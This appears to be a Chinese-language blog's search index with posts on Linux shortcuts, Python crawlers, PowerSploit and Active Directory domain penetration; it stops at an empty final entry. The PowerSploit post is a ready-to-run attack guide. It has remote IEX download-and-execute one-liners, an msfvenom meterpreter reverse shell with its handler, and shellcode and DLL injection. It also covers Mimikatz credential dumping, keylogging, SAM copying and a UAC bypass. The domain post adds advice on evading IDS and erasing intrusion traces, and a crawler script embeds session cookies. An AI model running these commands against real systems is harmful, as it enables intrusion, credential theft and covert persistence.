<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Linux实用技巧</title>
      <link href="/2019/03/28/Linux-practical-skills/"/>
      <url>/2019/03/28/Linux-practical-skills/</url>
      
        <content type="html"><![CDATA[<h3 id="光标移动及命令编辑"><a href="#光标移动及命令编辑" class="headerlink" title="光标移动及命令编辑"></a>光标移动及命令编辑</h3><blockquote><p><code>ctrl + u</code>：删除光标所在行整条命令<br><code>ctrl + k</code>：删除光标至结尾处的命令文本<br><code>ctrl + w</code>：删除光标左边的一个单词（空格隔开的字符串）<br><code>ctrl + a</code>：光标移动到命令开头<br><code>ctrl + e</code>：光标移动到命令结尾<br><code>alt + f</code>：光标向右移动一个单词<br><code>alt + b</code>：光标向左移动一个单词</p></blockquote><hr><h3 id="历史命令查询"><a href="#历史命令查询" class="headerlink" title="历史命令查询"></a>历史命令查询</h3><p>histroy记录了执行的历史命令</p><blockquote><p><code>![历史命令前的数字]</code>：快速执行历史命令<br><code>ctrl + r</code>：搜索执行过的命令<br><code>fc -l</code>：显示部分历史命令</p></blockquote><hr><h3 id="实时查看日志"><a href="#实时查看日志" class="headerlink" title="实时查看日志"></a>实时查看日志</h3><blockquote><p><code>tail -f [filename]</code>：实时显示日志文件内容<br><code>less [文件名]</code>、<code>shift + f</code>：实时显示日志文件内容</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Skill </tag>
            
            <tag> Command </tag>
            
            <tag> Hotkey </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫</title>
      <link href="/2019/03/22/Crawler/"/>
      <url>/2019/03/22/Crawler/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>网络爬虫，按照一定的规则，自动抓取网络信息的程序或者脚本</p><hr><h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><p>去除无效请求头，抓取特定标签信息</p><p>module01.py<br><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br>head_me = &#123;<br><span class="hljs-string">"Accept"</span>: <span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,<br><span class="hljs-string">"Accept-Encoding"</span>: <span class="hljs-string">"gzip, deflate, br"</span>,<br><span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6"</span>,<br><span class="hljs-string">"Cache-Control"</span>: <span class="hljs-string">"max-age=0"</span>,<br><span class="hljs-string">"Connection"</span>: <span class="hljs-string">"keep-alive"</span>,<br><span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"__jsluid=79f3d21d1f3928bb6d698e1aa56b6fa9; UM_distinctid=168ac507d95899-0bdc39e526236b-b781636-1fa400-168ac507d96331; pgv_pvi=2586685440; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; browse=CFlZTxUYU0BRV1lAVQJTRFBZSkdeQFBYWVBFRF1RWUxTUVxPXEhLThQ; Hm_lvt_d7682ab43891c68a00de46e9ce5b76aa=1552961840; Hm_lpvt_d7682ab43891c68a00de46e9ce5b76aa=1552961840; ci_session=8a4f47241915fa49ff5ad3b168bdb568f4f3a8b9; CNZZDATA1262179648=469647292-1549077335-%7C1552958777; pgv_si=s1260497920; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1552353494,1552477099,1552705976,1552961909; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1552961948"</span>,<br><span class="hljs-string">"Host"</span>: <span class="hljs-string">"www.xxllxx.com"</span>,<br><span class="hljs-string">"Upgrade-Insecure-Requests"</span>: <span class="hljs-string">"1"</span>,<br><span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"</span><br>&#125;<br><br>url_me = <span class="hljs-string">"http://www.xxllxx.com"</span><br>html_test = requests.get(url = url_me)<br>html_test.encoding=<span class="hljs-string">'utf-8'</span><br><span class="hljs-keyword">print</span> html_test.text<br></code></pre></td></tr></table></figure></p><hr><p>spider02.py<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br>import json<br>def pachong(i):<br>head_me=&#123;<br><span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"</span><br>&#125;<br><br>url_me=<span class="hljs-string">"https://www.xxllxx.com/courses/ajaxCourses"</span><br>post_data=&#123;<br><span class="hljs-string">"courseTag"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"courseDiffcuty"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"IsExp"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"producerId"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"orderField"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"pageIndex"</span>:i,<br><span class="hljs-string">"tagType"</span>:<span class="hljs-string">""</span>,<br><span class="hljs-string">"isOpen"</span>:<span class="hljs-string">""</span><br>&#125;<br><br>html_text=requests.post(url=url_me, headers=head_me, data=post_data)<br>new_text=json.loads(html_text.text)<br><br><span class="hljs-comment"># print new_text</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> new_text[<span class="hljs-string">'course'</span>][<span class="hljs-string">'result'</span>]:<br><span class="hljs-built_in">print</span> name[<span class="hljs-string">'courseName'</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,19):<br>pachong(i)<br></code></pre></td></tr></table></figure></p><hr><p>spider03.py<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br>from bs4 import BeautifulSoup<br><br>def jianshu(i):<br>  url_me=<span class="hljs-string">"http://www.jianshu.com/?page="</span>+str(i)<br>  head_me=&#123;<br>    <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"</span>,<br>    <span class="hljs-string">"Accept"</span>: <span class="hljs-string">"text/html, */*; q=0.01"</span>,<br>    <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"en-US,en;q=0.5"</span>,<br>    <span class="hljs-string">"Accept-Encoding"</span>: <span class="hljs-string">"gzip, deflate"</span>,<br>    <span class="hljs-string">"Referer"</span>: <span class="hljs-string">"https://www.jianshu.com/"</span>,<br>    <span class="hljs-string">"X-CSRF-Token"</span>: <span class="hljs-string">"/Rn0x3ke4Dk3ZO+MJF70kGHb+8SGKQID1nFsoRj5Tq4N/Le5UUAGnpvjaGQMlQk9vtCNwQXfEKqk10Prm/PK0A=="</span>,<br>    <span class="hljs-string">"X-INFINITESCROLL"</span>: <span class="hljs-string">"true"</span>,<br>    <span class="hljs-string">"X-Requested-With"</span>: <span class="hljs-string">"XMLHttpRequest"</span>,<br>  &#125;<br><br>  html_text=requests.get(url=url_me, headers=head_me)<br>  <span class="hljs-comment">#print(html_text.text)</span><br>  html=BeautifulSoup(html_text.text.encode(html_text.encoding).decode(<span class="hljs-string">'utf-8'</span>),<span class="hljs-string">"html.parser"</span>)<br>  a_all=html.find_all(<span class="hljs-string">'a'</span>,<span class="hljs-string">'title'</span>)<br>  p_all=html.find_all(<span class="hljs-string">'p'</span>,<span class="hljs-string">'abstract'</span>)<br><br>  with open(r<span class="hljs-string">"./jianshu.txt"</span>,<span class="hljs-string">"a"</span>,encoding=<span class="hljs-string">'utf-8'</span>) as file:<br>    <span class="hljs-keyword">for</span>(a,p) <span class="hljs-keyword">in</span> zip(a_all,p_all):<br>      file.write(a.string)<br>      file.write(p.string+<span class="hljs-string">'\n'</span>)<br>      file.write(<span class="hljs-string">"http://www.jianshu.com"</span>+a.get(<span class="hljs-string">'href'</span>)+<span class="hljs-string">'\n\n\n'</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (1,3):<br>  jianshu(i)<br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Information </tag>
            
            <tag> Crawler </tag>
            
            <tag> Gathering </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PowerSploit</title>
      <link href="/2019/03/20/PowerSploit/"/>
      <url>/2019/03/20/PowerSploit/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>内网渗透神器</p><hr><h2 id="基本使用过程"><a href="#基本使用过程" class="headerlink" title="基本使用过程"></a>基本使用过程</h2><ol><li><p>加载模块</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 远程加载</span><br>IEX(new-object net.webclient).downloadstring(<span class="hljs-string">"http://xxllxxxx"</span>)<br><br><span class="hljs-comment"># 本地加载</span><br>import-module xxllxxx<br></code></pre></td></tr></table></figure></li><li><p>使用模块<br>eg:</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-NinjaCopy.ps1 -path C:\Windows\System32\config\SAM -LocalDestination C:\SAM<br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 远程加载PowerView模块并查询net user</span><br>powershell.exe -Exec bypass <span class="hljs-string">"IEX(New-Object Net.WebClient).DownloadString('http://111.230.170.95/PowerSploit/Recon/PowerView.ps1');Get-NetUser"</span><br><br><span class="hljs-comment"># 本地加载并使用</span><br>powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-module .\PowerView.ps1;Invoke-U"</span><br>powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-module .\PowerView.ps1;Invoke-P"</span><br>powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-module .\PowerView.ps1;Get-IPAddress"</span><br>powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-module .\PowerView.ps1;Get-NetDomain"</span><br>powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-module .\PowerView.ps1;Get-NetUser"</span><br>powershell.exe -Exec bypass -Command <span class="hljs-string">"Import-module .\PowerView.ps1;Get-NetUser"</span><br></code></pre></td></tr></table></figure><hr><h3 id="反弹shell-metepreter"><a href="#反弹shell-metepreter" class="headerlink" title="反弹shell(metepreter)"></a>反弹shell(metepreter)</h3><ol><li><p>调用msfvenom生成一个反弹木马，以供invoke-shellcode注入，同样生成的反弹马放入web中</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.158.133 LPORT=4444 -f powershell -o /var/www/html/code<br></code></pre></td></tr></table></figure></li><li><p>powershell通过IEX下载调用invoke-shellcode及生成的反弹木马</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">IEX(New-Object Net.Webclient).DownloadString(<span class="hljs-string">"http://192.168.158.133/PowerSploit/CodeExecution/Invoke-Shellcode.ps1"</span>)<br></code></pre></td></tr></table></figure></li><li><p>metasploit设置监听（Payload、LHOST、LPORT）</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> Payload windows/x64/meterpreter_reverse_https<br><span class="hljs-built_in">set</span> LHOST 192.168.158.133<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure></li></ol><blockquote><ol><li>将shellcode注入到本地的Powershell<br>powershell中调用<code>invoke-shellcode</code><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-Shellcode -Shellcode <span class="hljs-variable">$buf</span> -Force<br></code></pre></td></tr></table></figure></li></ol></blockquote><blockquote><ol start="2"><li>将shellcode注入到指定进程<br>powershell中查看指定进程如：notepad<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -Name notepad<br></code></pre></td></tr></table></figure></li></ol></blockquote><p>注入指定进程<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-Shellcode -Shellcode <span class="hljs-variable">$buf</span> -ProcessID 2286 -Force<br></code></pre></td></tr></table></figure></p><p>还可调用Invoke-dllinjection模块，将DLL文件注入到进程</p><hr><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>调用<code>invoke-Portscan</code>扫描内网主机的端口<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\system32&gt; IEX(New-Object net.webclient).DownloadString(<span class="hljs-string">"http://192.168.158.133/PowerSploit/Recon/Invoke-Po<br>rtscan.ps1"</span>)<br><br>Invoke-Portscan -Hosts 192.168.174.200 -Ports <span class="hljs-string">"20-25"</span><br>Invoke-Portscan -Hosts 192.168.174.200 -Ports <span class="hljs-string">"21,22,23,80,1433,3306,3389,8080"</span><br></code></pre></td></tr></table></figure></p><p>一句话网段端口存活探测<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -Exec bypass <span class="hljs-string">"IEX(New-Object net.webclient).downloadstring('http://192.168.5.10/upload/xxllxx/PowerSploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 10.1.1.128/25 -Ports '20,21,22,23,25,53,80,123,134,135,161,162,8161,389,443,445,513,873,1433,1080,1521,1900,2049,2601,2082,3128,2604,2083,3312,3306,4899,4440,8834,4848,3312,3389,4440,5672,5900,6082,6379,7001,8000,8080,8089,8161,8649,9000,9090,9300,9999,10050,11211,28017,3777,27017,50000,50060,50070'"</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p><code>Exfiltrations</code>模块<br>调用Get-Keystrokes记录用户的键盘输入<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">IEX(New-Object net.webclient).DownloadString(<span class="hljs-string">"http://192.168.158.133/PowerSploit/Exfiltration/Get-Keystrokes.ps1"</span>)<br><br>Get-Keystrokes -LogPath C:\Users\xxllxx\Desktop\hack\Keystrokes.txt<br></code></pre></td></tr></table></figure></p><hr><h3 id="抓取内存中的明文密码"><a href="#抓取内存中的明文密码" class="headerlink" title="抓取内存中的明文密码"></a>抓取内存中的明文密码</h3><p><code>Invoke-Mimikatz</code>模块<br>通过IEX下载并调用Invoke-Mimikatz<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">IEX(New-Object net.webclient).downloadstring(<span class="hljs-string">"http://192.168.158.133/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1"</span>)<br><br>Invoke-Mimikatz -DumpCreds<br></code></pre></td></tr></table></figure></p><p>一句话版<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -Exec bypass <span class="hljs-string">"IEX(New-Object net.webclient).downloadstring('http://192.168.5.10/upload/xxllxx/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="用户访问控制绕过"><a href="#用户访问控制绕过" class="headerlink" title="用户访问控制绕过"></a>用户访问控制绕过</h3><p>Bypass UAC<br>当UAC为默认等级及以下时：<br><code>Powershell suite</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module .\Bypass-UAC.ps1;Bypass-UAC"</span><br></code></pre></td></tr></table></figure></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># win 7 Pro</span><br>![UacMethodSysprep]<br><br><span class="hljs-comment"># win 10 pro</span><br>![UacMethodTcmsetup]<br></code></pre></td></tr></table></figure><hr><h3 id="Powershell文件远程下载"><a href="#Powershell文件远程下载" class="headerlink" title="Powershell文件远程下载"></a>Powershell文件远程下载</h3><ul><li><p>windows 7</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -Exec bypass <span class="hljs-string">"IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168.5.10/upload/xxllxx/LCX-master/Lcx.exe','.\lcx.exe')"</span><br></code></pre></td></tr></table></figure></li><li><p>windows 8 及以上</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe <span class="hljs-string">"wget 'http://192.168.5.10/upload/xxllxx/LCX-master/Lcx.exe' -outfile '.\lcx.exe'"</span><br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> PowerSploit </tag>
            
            <tag> Domain </tag>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>域渗透</title>
      <link href="/2019/03/15/Domain-penetration/"/>
      <url>/2019/03/15/Domain-penetration/</url>
      
        <content type="html"><![CDATA[<h2 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h2><p>这里使用Windows server 2008 r2<br>dcpromo<br>关键步骤：</p><ol><li>域控：<br>添加角色向导：<br>添加角色–&gt;服务器角色–&gt;Active Directory 域服务</li></ol><p>Active Directory 域服务安装向导<br>在新林中新建域<br>输入域名xxx.com<br>DNS服务器</p><ol start="2"><li>客户：<br>系统–&gt;高级系统设置–&gt;系统属性–&gt;更改域<br>先脱离原先域：选择隶属于工作组<br>其它–&gt;输入与域控相同的域名</li></ol><h2 id="域环境操作"><a href="#域环境操作" class="headerlink" title="域环境操作"></a>域环境操作</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>whoami</code>  列出当前登录的用户信息<br><code>ipconfig /add</code>  查询本机IP段、所在域等<br><code>net user</code>  本机用户列表<br><code>net localhroup administrators</code>  本机管理员（通常含有域用户）<br><code>net user /domain</code>  查询域用户<br><code>net group /domain</code>  查询域用户<br><code>net group &quot;domain admins&quot; /domain</code>  查询域管理员用户组<br><code>net localgroup administrators /domain</code>  登录本机的域管理员<br><code>net localgroup administrators [workgroup]\user001 /add</code>  域用户添加到本机<br><code>net group &quot;domain controllers&quot; /domain</code>  查看域控制器（如果有多台）<br><code>net time /domain</code>  判断主域（主域服务器都做时间服务器）<br><code>net config workstation</code>  当前登录域<br><code>net session</code>  查看当前会话<br><code>net user \\ip\ipc$ password /user:username</code>  建立IPC会话[空连接-<code>***</code>]<br><code>net user x: \\192.168.10.100\gong</code> 文件共享<br><code>net share</code>  查看SMB指向的路径[即共享]<br><code>net view</code>  查询同一域内机器列表<br><code>net view \\ip</code>  查询某IP共享<br><code>net view /domain</code>  查询域列表<br><code>net view /domain:domainname</code>  查看workgroup域中计算机列表<br><code>net start</code>  查看当前运行的服务<br><code>net accounts</code>  查看本地密码策略<br><code>net accounts /domain</code>  查看域密码策略<br><code>nbtstat -A ip</code>  netbios查询<br><code>netstat -an/ano/anb</code>  网络连接查询<br><code>route print</code>  路由表<br><code>NETSH FIREWALL show all</code>  显示域/标准配置文件的允许的程序配置<br><code>tasklist /V</code>  查看进程[显示对应用户]<br><code>tasklist /S ip /U domain\username /p password /V</code>  查看远程计算机进程列表<br><code>qprocess *</code>  类似于tasklist<br><code>qprocess /SERVER:IP</code>  远程查看计算机进程列表<br><code>nslookup --qt-MX Yahoo.com</code>  查看邮件服务器<br><code>whoami /all</code>  查询当前用户权限<br><code>set</code>  查看系统环境变量<br><code>systeminfo</code>  查看系统信息<br><code>qwinsta</code>  查看登陆情况<br><code>qwinsta /SERVER:IP</code>  查看远程登录情况<br><code>fsutil fsinfo drives</code>  查看所有盘符<br><code>gpupdate /force</code>  更新域策略</p><hr><h3 id="wmic命令集"><a href="#wmic命令集" class="headerlink" title="wmic命令集"></a>wmic命令集</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>wmic命令集，Windows Management Instrumentation Command-line<br>wmic有2种命令执行方式：</p><ul><li><p>cmd输入wmic进入wmic控制台，再输入详细命令<br>如<code>process</code></p></li><li><p>cmd下直接输入<code>wmic process</code>执行<br>wmic提供了从命令行接口和批命令脚本执行系统管理的支持</p></li></ul><hr><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>process</code>  负责进程管理<br><code>service</code>  负责应用程序管理<br><code>bios</code>  基本输入/输出服务（BIOS）管理<br><code>qfe</code>  快速修复工程（补丁qfe get hotfixid）<br><code>startup</code>  当用户登录到计算机系统时自动运行的命令的管理<br><code>os</code>  已安装操作系统的管理<br><code>share</code>  共享资源管理<br><code>useraccount</code>  用户账户管理<br><code>logicaldisk</code>  本地存储设备管理<br><code>cpu</code>  CPU管理 </p><hr><h3 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery"></a>dsquery</h3><p>AD域中的管理利器<br><code>dsquery computer</code>  查找目录中的计算机<br><code>dsquery contact</code>  查找目录中的联系人<br><code>dsquery subnet</code>  查找目录中的子网<br><code>dsquery group</code>  查找目录中的组<br><code>dsquery ou</code>  查找目录中的组织单位<br><code>dsquery site</code>  查找目录中的站点<br><code>dsquery server</code>  查找目录中的AD DC/LDS实例<br><code>dsquery user</code>  查找目录中的用户<br><code>dsquery quota</code>  查找目录中的配额规定<br><code>dsquery partition</code>  查找目录中的分区<br><code>dsquery *</code>  用通用的LDAP查询来查找目录中的任何对象</p><hr><h3 id="命令行帮助"><a href="#命令行帮助" class="headerlink" title="命令行帮助"></a>命令行帮助</h3><p><code>/?</code>或<code>-?</code>  显示所有全局开关和别名的语法<br><code>//? /user /?</code>  显示指定全局开关的信息<br><code>/? class /?</code>  显示某个命令的信息<br><code>/? memcache /?</code>  显示某个别名的信息<br><code>/? temperature get /?</code>  显示别名与动词组合的信息<br><code>/?:Full irq get /?:Full</code>  显示动词的帮助信息<br>eg:<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic:root\cli&gt;process /?<br></code></pre></td></tr></table></figure></p><hr><h3 id="windows查找"><a href="#windows查找" class="headerlink" title="windows查找"></a>windows查找</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /r c:\ %i <span class="hljs-keyword">in</span> (flag.txt) <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> %i<br></code></pre></td></tr></table></figure><hr><h2 id="域环境渗透流程与技巧"><a href="#域环境渗透流程与技巧" class="headerlink" title="域环境渗透流程与技巧"></a>域环境渗透流程与技巧</h2><h3 id="域渗透目的"><a href="#域渗透目的" class="headerlink" title="域渗透目的"></a>域渗透目的</h3><p>从目的出发，找路线：<br>域中，由众多的服务器资源组成。想要摸清整个域结构，在一个很大的域中每一台尝试去渗透是不现实的（时间、精力不足）<br>因此，域渗透中瞄准的对象永远是DC（Domain Controller）域控，所有的一切准备工作都是为了<strong>获取域控</strong>，有了域控，整个域的拓扑、敏感信息信手拈来</p><hr><h3 id="域环境信息搜集"><a href="#域环境信息搜集" class="headerlink" title="域环境信息搜集"></a>域环境信息搜集</h3><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><ol><li>内网环境下先查看网络架构。如：网段信息、域控、DNS服务器、时间服务器</li><li>收集到了足够多的信息，考虑扫开放端口21、22、80、443、8080等确定敏感信息，以及之后的渗透方向</li><li>通过以上信息进行一定的弱口令尝试，针对特定的软件做banner采集利用，snamp测试读取和写入权限</li><li>进行一些提权操作，从横向和纵向对目标服务器进行渗透</li><li>注意ids和一些出口控制的绕过预警提示</li><li>进行敏感信息挖掘，同时擦出入侵足迹</li></ol><hr><h4 id="应当收集的信息："><a href="#应当收集的信息：" class="headerlink" title="应当收集的信息："></a>应当收集的信息：</h4><ul><li>已获取权限机：</li></ul><ol><li><p>用户列表[Windows用户列表/邮件列表/…]:<br>分析Windows用户列表，不要忽略administrator<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户，如：owa</p></li><li><p>进程列表：<br>分析杀毒软件/安全监控工具等<br>邮件客户端<br>VPN等</p></li><li><p>端口列表：<br>开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]<br>利用端口进行信息收集，建议深入挖掘[NETBIOS，SMB等]</p></li><li><p>补丁列表：<br>分析Windows补丁<br>第三方软件[Java/Oracle/Flash等]漏洞</p></li><li><p>本机共享[域内共享很多时候相同]：<br>本机共享列表/访问权限<br>本机访问的域共享/访问权限</p></li><li><p>本地用户习惯分析：<br>历史记录<br>收藏夹<br>文档等</p></li></ol><ul><li>扩散信息收集<br>利用本机获取的信息收集内网[域]其它机器的信息：</li></ul><ol><li>用户列表/共享/进程/服务等[参考已获取权限机]</li><li>收集Active Directory信息</li></ol><ul><li>第三方信息收集</li></ul><ol><li>NETBIOS信息收集工具</li><li>SMB </li><li>空会话信息收集</li><li>端口信息收集</li><li>漏洞信息收集</li></ol><hr><h3 id="找域控"><a href="#找域控" class="headerlink" title="找域控"></a>找域控</h3><p>找域控登入过的机器</p><ul><li><code>tasklist /s x.x.x.x /u username /p password /v</code></li><li>系统内部自带的工具<code>psloggedon.exe</code></li><li><code>netsess.exe</code></li><li><code>Nmap</code></li><li><code>Powershell</code></li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>渗透过程中，走到哪一步，需要做什么<br>使用powershell加载powersploit嗅探模块(recon)<br>需要权限，加载提权/查密码<br>需要维持，使用进程注入/dll注入</p>]]></content>
      
      
      
        <tags>
            
            <tag> Domain </tag>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hash基础</title>
      <link href="/2019/03/05/Hash/"/>
      <url>/2019/03/05/Hash/</url>
      
